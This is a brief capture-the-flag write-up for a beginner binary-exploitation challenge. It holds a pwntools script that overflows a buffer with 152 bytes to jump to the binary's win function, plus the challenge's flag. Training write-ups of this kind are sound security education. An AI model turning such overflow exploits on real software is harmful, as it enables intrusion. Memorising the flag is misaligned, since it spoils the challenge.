# Basics 1 | NoobMaster
- Description: Welcome, hope you enjoy pwning!

remote:nc challs.n00bzunit3d.xyz 32190
chall:/attachments/basics1/attachment.zip

# Write up
Simple ret2win, script -

```py
from pwn import *
elf = context.binary = ELF('../attachment/./chall')
io = elf.process()
io.sendline(b'A'*152 + pack(elf.symbols.win))
io.interactive()
```

# Flag - n00bz{b4s1c_r3t_t0_w1n_f0r_7he_w1n!}